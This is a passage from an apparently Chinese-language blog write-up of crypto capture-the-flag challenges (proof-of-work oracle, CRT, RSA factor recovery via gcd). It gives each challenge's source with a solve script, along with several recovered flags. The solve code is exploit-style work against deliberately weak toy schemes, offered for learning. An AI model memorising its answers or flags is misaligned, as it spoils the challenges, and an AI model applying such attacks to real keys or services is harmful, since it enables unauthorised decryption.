class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><br>flag = <span class="hljs-string">&quot;SYC&#123;...&#125;&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br><br>    ctry = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, prompt=<span class="hljs-string">b&#x27;[-] &#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.send(prompt, newline=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">self</span>):<br>        random.seed(os.urandom(<span class="hljs-number">8</span>))<br>        proof = <span class="hljs-string">&#x27;&#x27;</span>.join(<br>            [random.choice(string.ascii_letters+string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)])<br>        _hexdigest = sha256(proof.encode()).hexdigest()<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">f&quot;[+] sha256(XXXX+<span class="hljs-subst">&#123;proof[<span class="hljs-number">4</span>:]&#125;</span>) == <span class="hljs-subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())<br>        x = <span class="hljs-variable language_">self</span>.recv(prompt=<span class="hljs-string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x) != <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> sha256(x+proof[<span class="hljs-number">4</span>:].encode()).hexdigest() != _hexdigest:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        signal.alarm(<span class="hljs-number">60</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.proof_of_work():<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[!] Wrong!&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[*] Maybe you need a little force, right?&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[*] HEY, MY NEW FRIENDDD, YOUUUUUU FIND THE RIGHT WAAAAAAY!&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[*] Or even more complex?&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[*] Maybe these details are not important. See below :D&#x27;</span>)<br><br>            signal.alarm(<span class="hljs-number">400</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[+] &#x27;</span>)<br>            <span class="hljs-keyword">while</span> <span class="hljs-variable language_">self</span>.ctry &lt; <span class="hljs-number">35</span>:<br>                data = <span class="hljs-variable language_">self</span>.recv().decode()<br>                f = <span class="hljs-variable language_">self</span>.oraicle(data)<br>                <span class="hljs-variable language_">self</span>.send(f)<br>                <span class="hljs-variable language_">self</span>.ctry += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">except</span> TimeoutError:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[!] Ohhehe, Timeout!&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">oraicle</span>(<span class="hljs-params">self,a</span>):<br><br>        <span class="hljs-keyword">if</span> a.isdigit() <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a)&lt;<span class="hljs-number">33</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a)&gt;<span class="hljs-number">0</span>:<br>            a = <span class="hljs-built_in">int</span>(a)-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;[+] &#x27;</span> + flag[a].encode()<br><br>        <span class="hljs-keyword">return</span>  <span class="hljs-string">b&#x27;[!] Invalid Member!&#x27;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST,PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">12321</span><br>    server = ForkedServer((HOST,PORT),Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(HOST, PORT)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> sys<br><br>table = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> table:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> table:<br>                string = i + j + k + l + <span class="hljs-string">&quot;wMysYhu7k3xtiRw8&quot;</span><br>                str_sha256 = sha256(string.encode()).hexdigest()<br>                <span class="hljs-keyword">if</span> str_sha256 == <span class="hljs-string">&quot;8529c5821de162e1c9d1a10f40d43706cb6c157544e029c1bc0a2833d1603198&quot;</span>:<br>                    <span class="hljs-built_in">print</span>(i+j+k+l)<br>                    sys.exit()<br><span class="hljs-comment">#SYC&#123;MAYB3_Y0U_KN0W_A1AN-B3&lt;K3R?&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br>flag = <span class="hljs-string">b&#x27;SYC&#123;...&#125;&#x27;</span><br>m = bytes_to_long(flag+<span class="hljs-string">b&#x27;\x01&#x27;</span>*<span class="hljs-number">23</span>)<br><br>p = [<span class="hljs-number">0</span>]*<span class="hljs-number">5</span><br>c = [<span class="hljs-number">0</span>]*<span class="hljs-number">5</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    p0 = random.randint(<span class="hljs-number">2</span>**<span class="hljs-number">100</span>,<span class="hljs-number">2</span>**<span class="hljs-number">101</span>)<br>    p[i] = p0<br>c = [m%p[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p = [1921232050179818686537976490035, 2050175089402111328155892746480, 1960810970476421389691930930824, 1797713136323968089432024221276, 2326915607951286191807212748022]</span><br><span class="hljs-string">c = [1259284928311091851012441581576, 1501691203352712190922548476321, 1660842626322200346728249202857, 657314037433265072289232145909, 2056630082529583499248887436721]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>ms = [<span class="hljs-number">1921232050179818686537976490035</span>, <span class="hljs-number">2050175089402111328155892746480</span>, <span class="hljs-number">1960810970476421389691930930824</span>, <span class="hljs-number">1797713136323968089432024221276</span>, <span class="hljs-number">2326915607951286191807212748022</span>]<br>cs = [<span class="hljs-number">1259284928311091851012441581576</span>, <span class="hljs-number">1501691203352712190922548476321</span>, <span class="hljs-number">1660842626322200346728249202857</span>, <span class="hljs-number">657314037433265072289232145909</span>, <span class="hljs-number">2056630082529583499248887436721</span>]<br>x = crt(cs, ms)<br><span class="hljs-built_in">print</span>(long_to_bytes(x))<br></code></pre></td></tr></table></figure><h1 id="Number-theory"><a href="#Number-theory" class="headerlink" title="Number_theory"></a>Number_theory</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>m = bytes_to_long(flag)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q1 = getPrime(<span class="hljs-number">1024</span>)<br>p1 = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>n1 = p1 * q<br>h0 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">1012</span> * q + <span class="hljs-number">2024</span>, p1, n1)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;h0 = <span class="hljs-subst">&#123;h0&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n1 = <span class="hljs-subst">&#123;n1&#125;</span>&quot;</span>)<br><br>n2 = p * q1<br>h1 = getPrime(<span class="hljs-number">128</span>)*p+getPrime(<span class="hljs-number">13</span>)*q1<br>h2 = getPrime(<span class="hljs-number">128</span>)*p+getPrime(<span class="hljs-number">13</span>)*q1<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;h1 = <span class="hljs-subst">&#123;h1&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;h2 = <span class="hljs-subst">&#123;h2&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n2 = <span class="hljs-subst">&#123;n2&#125;</span>&#x27;</span>)<br><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">h0 = 3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span><br><span class="hljs-string">n1 = 20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span><br><span class="hljs-string">h1 = 49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span><br><span class="hljs-string">h2 = 56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span><br><span class="hljs-string">n2 = 21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span><br><span class="hljs-string">c = 5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>(1)<br>$h0\equiv (1012\cdot q+2024)^{p1} \mod n1$<br>$h0 \equiv 2024^{p1} \mod q$<br>两边同时取$q$次方：$h0^q \equiv 2024^{n1} \mod q$<br>$h0\equiv 2024^{n1}\mod q$<br>$h0 - 2024^{n1} &#x3D; k\cdot q$<br>$q &#x3D; gcd(h0-2024^{n1},n1)$<br>(2)<br>$h1 &#x3D; k1\cdot p+a\cdot q1$<br>$h2 &#x3D; k2\cdot p+ b\cdot q1$<br>由于$a,b$是小位数，可爆破出来，因此当作已知量<br>$b\cdot h1 &#x3D; b\cdot k1\cdot p+a\cdot b\cdot q1$<br>$a\cdot h2 &#x3D; a\cdot k2\cdot p+a\cdot b\cdot q1$<br>$b\cdot h1 - a\cdot h2 &#x3D; b\cdot k1\cdot p-a\cdot k2\cdot p&#x3D;(b\cdot k1-a\cdot k2)\cdot p$<br>则$p&#x3D;gcd(b\cdot h1-a\cdot h2,n2)$</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> isPrime,inverse,long_to_bytes<br>h0 = <span class="hljs-number">3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span><br>n1 = <span class="hljs-number">20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span><br>h1 = <span class="hljs-number">49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span><br>h2 = <span class="hljs-number">56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span><br>n2 = <span class="hljs-number">21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span><br>c = <span class="hljs-number">5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span><br>e = <span class="hljs-number">65537</span><br>q = gmpy2.gcd(h0-<span class="hljs-built_in">pow</span>(<span class="hljs-number">2024</span>,n1,n1),n1)<br><span class="hljs-built_in">print</span>(q)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">12</span>,<span class="hljs-number">2</span>**<span class="hljs-number">13</span>-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isPrime(a):<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">12</span>,<span class="hljs-number">2</span>**<span class="hljs-number">13</span>-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isPrime(b):<br>            <span class="hljs-keyword">continue</span><br>        p=gmpy2.gcd(b*h1-a*h2,n2)<br>        <span class="hljs-keyword">if</span> p!= <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(p)<br>            n = p*q<br>            phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>            d = inverse(e,phi)<br>            m = <span class="hljs-built_in">pow</span>(c,d,n)<br>            ans = long_to_bytes(m)<br>            <span class="hljs-built_in">print</span>(ans)<br>            exit()<br><br></code></pre></td></tr></table></figure><h1 id="RnoCRT"><a href="#RnoCRT" class="headerlink" title="RnoCRT"></a>RnoCRT</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> x<br><br>m = [getRandomNBitInteger(<span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br>u = hashlib.sha256(x).hexdigest()<br><span class="hljs-keyword">assert</span> u[:<span class="hljs-number">5</span>]==<span class="hljs-string">b&#x27;6a651&#x27;</span><br>flag = <span class="hljs-string">b&#x27;SYC&#123;&#x27;</span>+u+<span class="hljs-string">b&#x27;&#125;&#x27;</span><br>c = [x % i  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m]<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-comment">#[207867980504656835313307696396607264603, 245036212212570610987366430554968489325, 270836744824069537438646110613439698666, 319275775495422875474878625752594133023, 254268823435329877199449670714528712873, 213093607196415232366564484229844568444, 246921085368773491003187313772615702950]</span><br><span class="hljs-comment">#[150031581047390726903711035932621949276, 21260202376534810598778595491323328519, 144049733622518360270048059408969512643, 236920143187836025924037873968303507493, 99781504248790469459151935530031893836, 69236016568483424294966410179787943383, 20613188366058016717435734248097940419]</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><br>m=[<span class="hljs-number">207867980504656835313307696396607264603</span>, <span class="hljs-number">245036212212570610987366430554968489325</span>, <span class="hljs-number">270836744824069537438646110613439698666</span>, <span class="hljs-number">319275775495422875474878625752594133023</span>, <span class="hljs-number">254268823435329877199449670714528712873</span>, <span class="hljs-number">213093607196415232366564484229844568444</span>, <span class="hljs-number">246921085368773491003187313772615702950</span>]<br>c=[<span class="hljs-number">150031581047390726903711035932621949276</span>, <span class="hljs-number">21260202376534810598778595491323328519</span>, <span class="hljs-number">144049733622518360270048059408969512643</span>, <span class="hljs-number">236920143187836025924037873968303507493</span>, <span class="hljs-number">99781504248790469459151935530031893836</span>, <span class="hljs-number">69236016568483424294966410179787943383</span>, <span class="hljs-number">20613188366058016717435734248097940419</span>]<br>x = crt(c,m)<br><span class="hljs-comment">#print(x)</span><br>l=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    l=lcm(l,m[i])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    u = x + i*l<br>    u = hashlib.sha256(<span class="hljs-built_in">str</span>(u).encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> u[:<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;6a651&#x27;</span>:<br>        flag = <span class="hljs-string">b&#x27;SYC&#123;&#x27;</span> + u.encode() + <span class="hljs-string">b&#x27;&#125;&#x27;</span><br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>p = getPrime(<span class="hljs-number">128</span>)<br>q = getPrime(<span class="hljs-number">128</span>)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q = <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 33108009203593648507706487693709965711774665216872550007309537128959455938833</span><br><span class="hljs-string">p = 192173332221883349384646293941837353967</span><br><span class="hljs-string">q = 172282016556631997385463935089230918399</span><br><span class="hljs-string">c = 5366332878961364744687912786162467698377615956518615197391990327680664213847</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br>n = <span class="hljs-number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span><br>p = <span class="hljs-number">192173332221883349384646293941837353967</span><br>q = <span class="hljs-number">172282016556631997385463935089230918399</span><br>c = <span class="hljs-number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span><br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="XOR"><a href="#XOR" class="headerlink" 